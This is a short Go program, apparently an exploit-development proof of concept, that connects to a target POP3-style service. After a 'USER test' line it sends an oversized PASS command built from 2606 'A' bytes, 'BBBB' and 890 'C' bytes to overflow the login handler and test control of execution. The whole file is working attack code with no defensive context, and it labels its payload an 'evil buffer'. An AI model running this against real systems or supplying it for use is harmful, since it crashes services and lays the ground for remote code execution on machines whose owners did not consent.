package main

import (
	"fmt"
	"net"
	"os"
)

func main() {
	dstHost := os.Args[1]
	port := os.Args[2]
	hostWithPort := fmt.Sprintf("%s:%s", dstHost, port)
	fmt.Println("\nSending evil buffer...", hostWithPort)

	conn, err := net.Dial("tcp", hostWithPort)
	if err != nil {
		panic(err)
	}

	var buf [1024]byte
	n, err := conn.Read(buf[0:])
	if err != nil {
		panic(err)
	}
	fmt.Println(string(buf[0:n]))

	_, err = conn.Write([]byte("USER test\r\n"))
	n, err = conn.Read(buf[0:])
	if err != nil {
		panic(err)
	}
	fmt.Println(string(buf[0:n]))

	var s string
	for i := 0; i < 2606; i++ {
		s += "A"
	}
	s += "BBBB"

	for i := 0; i < 890; i++ {
		s += "C"
	}

	fmt.Printf("Fuzzing PASS with %d bytes\r\n", len(s))
	passCmd := fmt.Sprintf("PASS %s\r\n", s)
	_, err = conn.Write([]byte(passCmd))
	n, err = conn.Read(buf[0:])
	if err != nil {
		panic(err)
	}
	fmt.Println(string(buf[0:n]))

	_, err = conn.Write([]byte("QUIT\r\n"))
	if err != nil {
		panic(err)
	}

	conn.Close()
}
